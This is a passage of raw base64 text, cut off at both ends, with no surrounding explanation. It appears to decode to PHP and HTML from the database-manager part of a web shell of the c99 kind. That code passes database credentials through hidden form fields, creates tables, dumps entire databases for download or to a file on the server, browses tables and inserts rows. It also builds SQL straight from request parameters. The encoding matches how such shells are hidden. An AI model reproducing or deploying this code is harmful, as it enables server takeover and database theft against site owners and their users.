Gg9IjEwMCUiIGhlaWdodD0iMSI+PHRyPjx0ZCB3aWR0aD0iMzAlIiBoZWlnaHQ9IjEiPjxiPkNyZWF0ZSBuZXcgdGFibGU6PC9iPgogICAgICAgIDxmb3JtIGFjdGlvbj0iPD9waHAgZWNobyAkc3VybDsgPz4iPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdCIgdmFsdWU9InNxbCI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX2FjdCIgdmFsdWU9Im5ld3RibCI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX2RiIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfZGIpOyA/PiI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX2xvZ2luIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfbG9naW4pOyA/PiI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX3Bhc3N3ZCIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkc3FsX3Bhc3N3ZCk7ID8+Ij4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzcWxfc2VydmVyIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfc2VydmVyKTsgPz4iPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9wb3J0IiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfcG9ydCk7ID8+Ij4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ic3FsX25ld3RibCIgc2l6ZT0iMjAiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDcmVhdGUiPgogICAgICAgIDwvZm9ybT48L3RkPgogICAgICAgIDx0ZCB3aWR0aD0iMzAlIiBoZWlnaHQ9IjEiPjxiPkR1bXAgREI6PC9iPgogICAgICAgIDxmb3JtIGFjdGlvbj0iPD9waHAgZWNobyAkc3VybDsgPz4iPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdCIgdmFsdWU9InNxbCI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX2FjdCIgdmFsdWU9ImR1bXAiPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9kYiIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkc3FsX2RiKTsgPz4iPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9sb2dpbiIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkc3FsX2xvZ2luKTsgPz4iPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9wYXNzd2QiIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wYXNzd2QpOyA/PiI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX3NlcnZlciIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkc3FsX3NlcnZlcik7ID8+Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzcWxfcG9ydCIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkc3FsX3BvcnQpOyA/PiI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImR1bXBfZmlsZSIgc2l6ZT0iMzAiIHZhbHVlPSI8P3BocCBlY2hvICJkdW1wXyIuZ2V0ZW52KCJTRVJWRVJfTkFNRSIpLiJfIi4kc3FsX2RiLiJfIi5kYXRlKCJkLW0tWS1ILWktcyIpLiIuc3FsIjsgPz4iPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9XCJzdWJtaXRcIiB2YWx1ZT0iRHVtcCI+PC9mb3JtPjwvdGQ+PHRkIHdpZHRoPSIzMCUiIGhlaWdodD0iMSI+PC90ZD48L3RyPjx0cj48dGQgd2lkdGg9IjMwJSIgaGVpZ2h0PSIxIj48L3RkPjx0ZCB3aWR0aD0iMzAlIiBoZWlnaHQ9IjEiPjwvdGQ+PHRkIHdpZHRoPSIzMCUiIGhlaWdodD0iMSI+PC90ZD48L3RyPjwvdGFibGU+CiAgICAgICAgPD9waHAKICAgICAgICBpZiAoIWVtcHR5KCRzcWxfYWN0KSkge2VjaG8gIjxociBzaXplPVwiMVwiIG5vc2hhZGU+Ijt9CiAgICAgICAgaWYgKCRzcWxfYWN0ID09ICJuZXd0YmwiKSB7CiAgICAgICAgICBlY2hvICI8Yj4iOwogICAgICAgICAgaWYgKChteXNxbF9jcmVhdGVfZGIgKCRzcWxfbmV3ZGIpKSBhbmQgKCFlbXB0eSgkc3FsX25ld2RiKSkpIHsKICAgICAgICAgICAgZWNobyAiREIgXCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9uZXdkYikuIlwiIGhhcyBiZWVuIGNyZWF0ZWQgd2l0aCBzdWNjZXNzITwvYj48YnI+IjsKICAgICAgICAgIH0KICAgICAgICAgIGVsc2Uge2VjaG8gIkNhbid0IGNyZWF0ZSBEQiBcIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX25ld2RiKS4iXCIuPGJyPlJlYXNvbjo8L2I+ICIubXlzcWxfc21hcnRlcnJvcigpO30KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkc3FsX2FjdCA9PSAiZHVtcCIpIHsKICAgICAgICAgIGlmIChlbXB0eSgkc3VibWl0KSkgewogICAgICAgICAgICAkZGlwbGF5ID0gRkFMU0U7CiAgICAgICAgICAgIGVjaG8gIjxmb3JtIG1ldGhvZD1cIkdFVFwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImFjdFwiIHZhbHVlPVwic3FsXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX2FjdFwiIHZhbHVlPVwiZHVtcFwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInNxbF9kYlwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRzcWxfZGIpLiJcIj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJzcWxfbG9naW5cIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX2xvZ2luKS4iXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX3Bhc3N3ZFwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRzcWxfcGFzc3dkKS4iXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX3NlcnZlclwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRzcWxfc2VydmVyKS4iXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX3BvcnRcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3BvcnQpLiJcIj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJzcWxfdGJsXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF90YmwpLiJcIj48Yj5TUUwtRHVtcDo8L2I+PGJyPjxicj4iOwogICAgICAgICAgICBlY2hvICI8Yj5EQjo8L2I+IDxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJzcWxfZGJcIiB2YWx1ZT1cIiIudXJsZW5jb2RlKCRzcWxfZGIpLiJcIj48YnI+PGJyPiI7CiAgICAgICAgICAgICR2ID0gam9pbiAoIjsiLCRkbXB0YmxzKTsKICAgICAgICAgICAgZWNobyAiPGI+T25seSB0YWJsZXMgKGV4cGxvZGUgXCI7XCIpJm5ic3A7PGI+PHN1cD4xPC9zdXA+PC9iPjo8L2I+Jm5ic3A7PGlucHV0IHR5cGU9XCJ0ZXh0XCIgbmFtZT1cImRtcHRibHNcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkdikuIlwiIHNpemU9XCIiLihzdHJsZW4oJHYpKzUpLiJcIj48YnI+PGJyPiI7CiAgICAgICAgICAgIGlmICgkZHVtcF9maWxlKSB7JHRtcCA9ICRkdW1wX2ZpbGU7fQogICAgICAgICAgICBlbHNlIHskdG1wID0gaHRtbHNwZWNpYWxjaGFycygiLi9kdW1wXyIuZ2V0ZW52KCJTRVJWRVJfTkFNRSIpLiJfIi4kc3FsX2RiLiJfIi5kYXRlKCJkLW0tWS1ILWktcyIpLiIuc3FsIik7fQogICAgICAgICAgICBlY2hvICI8Yj5GaWxlOjwvYj4mbmJzcDs8aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwic3FsX2R1bXBfZmlsZVwiIHZhbHVlPVwiIi4kdG1wLiJcIiBzaXplPVwiIi4oc3RybGVuKCR0bXApK3N0cmxlbigkdG1wKSAlIDMwKS4iXCI+PGJyPjxicj4iOwogICAgICAgICAgICBlY2hvICI8Yj5Eb3dubG9hZDogPC9iPiZuYnNwOzxpbnB1dCB0eXBlPVwiY2hlY2tib3hcIiBuYW1lPVwic3FsX2R1bXBfZG93bmxvYWRcIiB2YWx1ZT1cIjFcIiBjaGVja2VkPjxicj48YnI+IjsKICAgICAgICAgICAgZWNobyAiPGI+U2F2ZSB0byBmaWxlOiA8L2I+Jm5ic3A7PGlucHV0IHR5cGU9XCJjaGVja2JveFwiIG5hbWU9XCJzcWxfZHVtcF9zYXZldG9maWxlXCIgdmFsdWU9XCIxXCIgY2hlY2tlZD4iOwogICAgICAgICAgICBlY2hvICI8YnI+PGJyPjxpbnB1dCB0eXBlPVwic3VibWl0XCIgbmFtZT1cInN1Ym1pdFwiIHZhbHVlPVwiRHVtcFwiPjxicj48YnI+PGI+PHN1cD4xPC9zdXA+PC9iPiAtIGFsbCwgaWYgZW1wdHkiOwogICAgICAgICAgICBlY2hvICI8L2Zvcm0+IjsKICAgICAgICAgIH0KICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAkZGlwbGF5ID0gVFJVRTsKICAgICAgICAgICAgJHNldCA9IGFycmF5KCk7CiAgICAgICAgICAgICRzZXRbInNvY2siXSA9ICRzcWxfc29jazsKICAgICAgICAgICAgJHNldFsiZGIiXSA9ICRzcWxfZGI7CiAgICAgICAgICAgICRkdW1wX291dCA9ICJkb3dubG9hZCI7CiAgICAgICAgICAgICRzZXRbInByaW50Il0gPSAwOwogICAgICAgICAgICAkc2V0WyJubDJiciJdID0gMDsKICAgICAgICAgICAgJHNldFsiIl0gPSAwOwogICAgICAgICAgICAkc2V0WyJmaWxlIl0gPSAkZHVtcF9maWxlOwogICAgICAgICAgICAkc2V0WyJhZGRfZHJvcCJdID0gVFJVRTsKICAgICAgICAgICAgJHNldFsib25seXRhYnMiXSA9IGFycmF5KCk7CiAgICAgICAgICAgIGlmICghZW1wdHkoJGRtcHRibHMpKSB7JHNldFsib25seXRhYnMiXSA9IGV4cGxvZGUoIjsiLCRkbXB0YmxzKTt9CiAgICAgICAgICAgICRyZXQgPSBteXNxbF9kdW1wKCRzZXQpOwogICAgICAgICAgICBpZiAoJHNxbF9kdW1wX2Rvd25sb2FkKSB7CiAgICAgICAgICAgICAgQG9iX2NsZWFuKCk7CiAgICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIpOwogICAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1sZW5ndGg6ICIuc3RybGVuKCRyZXQpKTsKICAgICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtZGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPVwiIi5iYXNlbmFtZSgkc3FsX2R1bXBfZmlsZSkuIlwiOyIpOwogICAgICAgICAgICAgIGVjaG8gJHJldDsKICAgICAgICAgICAgICBleGl0OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJHNxbF9kdW1wX3NhdmV0b2ZpbGUpIHsKICAgICAgICAgICAgICAkZnAgPSBmb3Blbigkc3FsX2R1bXBfZmlsZSwidyIpOwogICAgICAgICAgICAgIGlmICghJGZwKSB7ZWNobyAiPGI+RHVtcCBlcnJvciEgQ2FuJ3Qgd3JpdGUgdG8gXCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9kdW1wX2ZpbGUpLiJcIiEiO30KICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGZ3cml0ZSgkZnAsJHJldCk7CiAgICAgICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICAgICAgICAgIGVjaG8gIjxiPkR1bXBlZCEgRHVtcCBoYXMgYmVlbiB3cml0ZWQgdG8gXCIiLmh0bWxzcGVjaWFsY2hhcnMocmVhbHBhdGgoJHNxbF9kdW1wX2ZpbGUpKS4iXCIgKCIudmlld19zaXplKGZpbGVzaXplKCRzcWxfZHVtcF9maWxlKSkuIik8L2I+LiI7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2Uge2VjaG8gIjxiPkR1bXA6IG5vdGhpbmcgdG8gZG8hPC9iPiI7fQogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoJGRpcGxheSkgewogICAgaWYgKCFlbXB0eSgkc3FsX3RibCkpIHsKICAgICAgaWYgKGVtcHR5KCRzcWxfdGJsX2FjdCkpIHskc3FsX3RibF9hY3QgPSAiYnJvd3NlIjt9CiAgICAgICRjb3VudCA9IG15c3FsX3F1ZXJ5KCJTRUxFQ1QgQ09VTlQoKikgRlJPTSBgIi4kc3FsX3RibC4iYDsiKTsKICAgICAgJGNvdW50X3JvdyA9IG15c3FsX2ZldGNoX2FycmF5KCRjb3VudCk7CiAgICAgIG15c3FsX2ZyZWVfcmVzdWx0KCRjb3VudCk7CiAgICAgICR0Ymxfc3RydWN0X3Jlc3VsdCA9IG15c3FsX3F1ZXJ5KCJTSE9XIEZJRUxEUyBGUk9NIGAiLiRzcWxfdGJsLiJgOyIpOwogICAgICAkdGJsX3N0cnVjdF9maWVsZHMgPSBhcnJheSgpOwogICAgICB3aGlsZSAoJHJvdyA9IG15c3FsX2ZldGNoX2Fzc29jKCR0Ymxfc3RydWN0X3Jlc3VsdCkpIHskdGJsX3N0cnVjdF9maWVsZHNbXSA9ICRyb3c7fQogICAgICBpZiAoJHNxbF9scyA+ICRzcWxfbGUpIHskc3FsX2xlID0gJHNxbF9scyArICRwZXJwYWdlO30KICAgICAgaWYgKGVtcHR5KCRzcWxfdGJsX3BhZ2UpKSB7JHNxbF90YmxfcGFnZSA9IDA7fQogICAgICBpZiAoZW1wdHkoJHNxbF90YmxfbHMpKSB7JHNxbF90YmxfbHMgPSAwO30KICAgICAgaWYgKGVtcHR5KCRzcWxfdGJsX2xlKSkgeyRzcWxfdGJsX2xlID0gMzA7fQogICAgICAkcGVycGFnZSA9ICRzcWxfdGJsX2xlIC0gJHNxbF90YmxfbHM7CiAgICAgIGlmICghaXNfbnVtZXJpYygkcGVycGFnZSkpIHskcGVycGFnZSA9IDEwO30KICAgICAgJG51bXBhZ2VzID0gJGNvdW50X3Jvd1swXS8kcGVycGFnZTsKICAgICAgJGUgPSBleHBsb2RlKCIgIiwkc3FsX29yZGVyKTsKICAgICAgaWYgKGNvdW50KCRlKSA9PSAyKSB7CiAgICAgICAgaWYgKCRlWzBdID09ICJkIikgeyRhc2NfZGVzYyA9ICJERVNDIjt9CiAgICAgICAgZWxzZSB7JGFzY19kZXNjID0gIkFTQyI7fQogICAgICAgICR2ID0gIk9SREVSIEJZIGAiLiRlWzFdLiJgICIuJGFzY19kZXNjLiIgIjsKICAgICAgfQogICAgICBlbHNlIHskdiA9ICIiO30KICAgICAgJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gYCIuJHNxbF90YmwuImAgIi4kdi4iTElNSVQgIi4kc3FsX3RibF9scy4iICwgIi4kcGVycGFnZS4iIjsKICAgICAgJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCRxdWVyeSkgb3IgcHJpbnQobXlzcWxfc21hcnRlcnJvcigpKTsKICAgICAgZWNobyAiPGhyIHNpemU9XCIxXCIgbm9zaGFkZT48Y2VudGVyPjxiPlRhYmxlICIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3RibCkuIiAoIi5teXNxbF9udW1fZmllbGRzKCRyZXN1bHQpLiIgY29scyBhbmQgIi4kY291bnRfcm93WzBdLiIgcm93cyk8L2I+PC9jZW50ZXI+IjsKICAgICAgZWNobyAiPGEgaHJlZj1cIiIuJHNxbF9zdXJsLiJzcWxfdGJsPSIudXJsZW5jb2RlKCRzcWxfdGJsKS4iJnNxbF90YmxfYWN0PXN0cnVjdHVyZVwiPls8Yj4gU3RydWN0dXJlIDwvYj5dPC9hPiZuYnNwOyZuYnNwOyZuYnNwOyI7CiAgICAgIGVjaG8gIjxhIGhyZWY9XCIiLiRzcWxfc3VybC4ic3FsX3RibD0iLnVybGVuY29kZSgkc3FsX3RibCkuIiZzcWxfdGJsX2FjdD1icm93c2VcIj5bPGI+IEJyb3dzZSA8L2I+XTwvYT4mbmJzcDsmbmJzcDsmbmJzcDsiOwogICAgICBlY2hvICI8YSBocmVmPVwiIi4kc3FsX3N1cmwuInNxbF90Ymw9Ii51cmxlbmNvZGUoJHNxbF90YmwpLiImc3FsX2FjdD10YmxkdW1wJnRoaXN0Ymw9MVwiPls8Yj4gRHVtcCA8L2I+XTwvYT4mbmJzcDsmbmJzcDsmbmJzcDsiOwogICAgICBlY2hvICI8YSBocmVmPVwiIi4kc3FsX3N1cmwuInNxbF90Ymw9Ii51cmxlbmNvZGUoJHNxbF90YmwpLiImc3FsX3RibF9hY3Q9aW5zZXJ0XCI+WyZuYnNwOzxiPkluc2VydDwvYj4mbmJzcDtdPC9hPiZuYnNwOyZuYnNwOyZuYnNwOyI7CiAgICAgIGlmICgkc3FsX3RibF9hY3QgPT0gInN0cnVjdHVyZSIpIHtlY2hvICI8YnI+PGJyPjxiPkNvbWluZyBzb29vbiE8L2I+Ijt9CiAgICAgIGlmICgkc3FsX3RibF9hY3QgPT0gImluc2VydCIpIHsKICAgICAgICBpZiAoIWlzX2FycmF5KCRzcWxfdGJsX2luc2VydCkpIHskc3FsX3RibF9pbnNlcnQgPSBhcnJheSgpO30KICAgICAgICBpZiAoIWVtcHR5KCRzcWxfdGJsX2luc2VydF9yYWRpbykpIHsgIH0gLy9Ob3QgUmVhZHkKICAgICAgICBlbHNlIHsKICAgICAgICAgIGVjaG8gIjxicj48YnI+PGI+SW5zZXJ0aW5nIHJvdyBpbnRvIHRhYmxlOjwvYj48YnI+IjsKICAgICAgICAgIGlmICghZW1wdHkoJHNxbF90YmxfaW5zZXJ0X3EpKSB7CiAgICAgICAgICAgICRzcWxfcXVlcnkgPSAiU0VMRUNUICogRlJPTSBgIi4kc3FsX3RibC4iYCI7CiAgICAgICAgICAgICRzcWxfcXVlcnkgLj0gIiBXSEVSRSIuJHNxbF90YmxfaW5zZXJ0X3E7CiAgICAgICAgICAgICRzcWxfcXVlcnkgLj0gIiBMSU1JVCAxOyI7CiAgICAgICAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgkc3FsX3F1ZXJ5LCRzcWxfc29jaykgb3IgcHJpbnQoIjxicj48YnI+Ii5teXNxbF9zbWFydGVycm9yKCkpOwogICAgICAgICAgICAkdmFsdWVzID0gbXlzcWxfZmV0Y2hfYXNzb2MoJHJlc3VsdCk7CiAgICAgICAgICAgIG15c3FsX2ZyZWVfcmVzdWx0KCRyZXN1bHQpOwogICAgICAgICAgfQogICAgICAgICAgZWxzZSB7JHZhbHVlcyA9IGFycmF5KCk7fQogICAgICAgICAgZWNobyAiPGZvcm0gbWV0aG9kPVwiUE9TVFwiPjx0YWJsZSB3aWR0aD1cIjElXCIgYm9yZGVyPTE+PHRyPjx0ZD48Yj5GaWVsZDwvYj48L3RkPjx0ZD48Yj5UeXBlPC9iPjwvdGQ+PHRkPjxiPkZ1bmN0aW9uPC9iPjwvdGQ+PHRkPjxiPlZhbHVlPC9iPjwvdGQ+PC90cj4iOwogICAgICAgICAgZm9yZWFjaCAoJHRibF9zdHJ1Y3RfZmllbGRzIGFzICRmaWVsZCkgewogICAgICAgICAgICAkbmFtZSA9ICRmaWVsZFsiRmllbGQiXTsKICAgICAgICAgICAgaWYgKGVtcHR5KCRzcWxfdGJsX2luc2VydF9xKSkgeyR2ID0gIiI7fQogICAgICAgICAgICBlY2hvICI8dHI+PHRkPjxiPiIuaHRtbHNwZWNpYWxjaGFycygkbmFtZSkuIjwvYj48L3RkPjx0ZD4iLiRmaWVsZFsiVHlwZSJdLiI8L3RkPjx0ZD48c2VsZWN0IG5hbWU9XCJzcWxfdGJsX2luc2VydF9mdW5jdHNbIi5odG1sc3BlY2lhbGNoYXJzKCRuYW1lKS4iXVwiPjxvcHRpb24gdmFsdWU9XCJcIj48L29wdGlvbj48b3B0aW9uPlBBU1NXT1JEPC9vcHRpb24+PG9wdGlvbj5NRDU8L29wdGlvbj48b3B0aW9uPkVOQ1JZUFQ8L29wdGlvbj48b3B0aW9uPkFTQ0lJPC9vcHRpb24+PG9wdGlvbj5DSEFSPC9vcHRpb24+PG9wdGlvbj5SQU5EPC9vcHRpb24+PG9wdGlvbj5MQVNUX0lOU0VSVF9JRDwvb3B0aW9uPjxvcHRpb24+Q09VTlQ8L29wdGlvbj48b3B0aW9uPkFWRzwvb3B0aW9uPjxvcHRpb24+U1VNPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT1cIlwiPi0tLS0tLS0tPC9vcHRpb24+PG9wdGlvbj5TT1VOREVYPC9vcHRpb24+PG9wdGlvbj5MQ0FTRTwvb3B0aW9uPjxvcHRpb24+VUNBU0U8L29wdGlvbj48b3B0aW9uPk5PVzwvb3B0aW9uPjxvcHRpb24+Q1VSREFURTwvb3B0aW9uPjxvcHRpb24+Q1VSVElNRTwvb3B0aW9uPjxvcHRpb24+RlJPTV9EQVlTPC9vcHRpb24+PG9wdGlvbj5GUk9NX1VOSVhUSU1FPC9vcHRpb24+PG9wdGlvbj5QRVJJT0RfQUREPC9vcHRpb24+PG9wdGlvbj5QRVJJT0RfRElGRjwvb3B0aW9uPjxvcHRpb24+VE9fREFZUzwvb3B0aW9uPjxvcHRpb24+VU5JWF9USU1FU1RBTVA8L29wdGlvbj48b3B0aW9uPlVTRVI8L29wdGlvbj48b3B0aW9uPldFRUtEQVk8L29wdGlvbj48b3B0aW9uPkNPTkNBVDwvb3B0aW9uPjwvc2VsZWN0PjwvdGQ+PHRkPjxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJzcWxfdGJsX2luc2VydFsiLmh0bWxzcGVjaWFsY2hhcnMoJG5hbWUpLiJdXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJHZhbHVlc1skbmFtZV0pLiJcIiBzaXplPTUwPjwvdGQ+PC90cj4iOwogICAgICAgICAgICAkaSsrOwogICAgICAgICAgfQogICAgICAgICAgZWNobyAiPC90YWJsZT48YnI+IjsKICAgICAgICAgIGVjaG8gIjxpbnB1dCB0eXBlPVwicmFkaW9cIiBuYW1lPVwic3FsX3RibF9pbnNlcnRfcmFkaW9cIiB2YWx1ZT1cIjFcIiI7IGlmIChlbXB0eSgkc3FsX3RibF9pbnNlcnRfcSkpIHtlY2hvICIgY2hlY2tlZCI7fSBlY2hvICI+PGI+SW5zZXJ0IGFzIG5ldyByb3c8L2I+IjsKICAgICAgICAgIGlmICghZW1wdHkoJHNxbF90YmxfaW5zZXJ0X3EpKSB7ZWNobyAiIG9yIDxpbnB1dCB0eXBlPVwicmFkaW9cIiBuYW1lPVwic3FsX3RibF9pbnNlcnRfcmFkaW9cIiB2YWx1ZT1cIjJcIiBjaGVja2VkPjxiPlNhdmU8L2I+IjsgZWNobyAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX3RibF9pbnNlcnRfcVwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRzcWxfdGJsX2luc2VydF9xKS4iXCI+Ijt9CiAgICAgICAgICBlY2hvICI8YnI+PGJyPjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJDb25maXJtXCI+PC9mb3JtPiI7CiAgICAgICAgfQogICAgICB9CiAgICAgIGlmICgkc3FsX3RibF9hY3QgPT0gImJyb3dzZSIpIHsKICAgICAgICAkc3FsX3RibF9scyA9IGFicygkc3FsX3RibF9scyk7CiAgICAgICAgJHNxbF90YmxfbGUgPSBhYnMoJHNxbF90YmxfbGUpOwogICAgICAgIGVjaG8gIjxociBzaXplPVwiMVwiIG5vc2hhZGU+IjsKICAgICAgICBlY2hvICI8aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPW11bHRpcGFnZVwiIGhlaWdodD1cIjEyXCIgd2lkdGg9XCIxMFwiIGFsdD1cIlBhZ2VzXCI+Jm5ic3A7IjsKICAgICAgICAkYiA9IDA7CiAgICAgICAgZm9yKCRpPTA7JGk8JG51bXBhZ2VzOyRpKyspIHsKICAgICAgICAgIGlmICgoJGkqJHBlcnBhZ2UgIT0gJHNxbF90YmxfbHMpIG9yICgkaSokcGVycGFnZSskcGVycGFnZSAhPSAkc3FsX3RibF9sZSkpIHtlY2hvICI8YSBocmVmPVwiIi4kc3FsX3N1cmwuInNxbF90Ymw9Ii51cmxlbmNvZGUoJHNxbF90YmwpLiImc3FsX29yZGVyPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX29yZGVyKS4iJnNxbF90YmxfbHM9Ii4oJGkqJHBlcnBhZ2UpLiImc3FsX3RibF9sZT0iLigkaSokcGVycGFnZSskcGVycGFnZSkuIlwiPjx1PiI7fQogICAgICAgICAgZWNobyAkaTsKICAgICAgICAgIGlmICgoJGkqJHBlcnBhZ2UgIT0gJHNxbF90YmxfbHMpIG9yICgkaSokcGVycGFnZSskcGVycGFnZSAhPSAkc3FsX3RibF9sZSkpIHtlY2hvICI8L3U+PC9hPiI7fQogICAgICAgICAgaWYgKCgkaS8zMCA9PSByb3VuZCgkaS8zMCkpIGFuZCAoJGkgPiAwKSkge2VjaG8gIjxicj4iO30KICAgICAgICAgIGVsc2Uge2VjaG8gIiZuYnNwOyI7fQogICAgICAgIH0KICAgICAgICBpZiAoJGkgPT0gMCkge2VjaG8gImVtcHR5Ijt9CiAgICAgICAgZWNobyAiPGZvcm0gbWV0aG9kPVwiR0VUXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiYWN0XCIgdmFsdWU9XCJzcWxcIj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJzcWxfZGJcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX2RiKS4iXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX2xvZ2luXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9sb2dpbikuIlwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInNxbF9wYXNzd2RcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3Bhc3N3ZCkuIlwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInNxbF9zZXJ2ZXJcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3NlcnZlcikuIlwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInNxbF9wb3J0XCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wb3J0KS4iXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX3RibFwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRzcWxfdGJsKS4iXCI+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX29yZGVyXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9vcmRlcikuIlwiPjxiPkZyb206PC9iPiZuYnNwOzxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJzcWxfdGJsX2xzXCIgdmFsdWU9XCIiLiRzcWxfdGJsX2xzLiJcIj4mbmJzcDs8Yj5Ubzo8L2I+Jm5ic3A7PGlucHV0IHR5cGU9XCJ0ZXh0XCIgbmFtZT1cInNxbF90YmxfbGVcIiB2YWx1ZT1cIiIuJHNxbF90YmxfbGUuIlwiPiZuYnNwOzxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJWaWV3XCI+PC9mb3JtPiI7CiAgICAgICAgZWNobyAiPGJyPjxmb3JtIG1ldGhvZD1cIlBPU1RcIj48VEFCTEUgY2VsbFNwYWNpbmc9MCBib3JkZXJDb2xvckRhcms9IzY2NjY2NiBjZWxsUGFkZGluZz01IHdpZHRoPVwiMSVcIiBiZ2NvbG9yPSMwMDAwMDAgYm9yZGVyQ2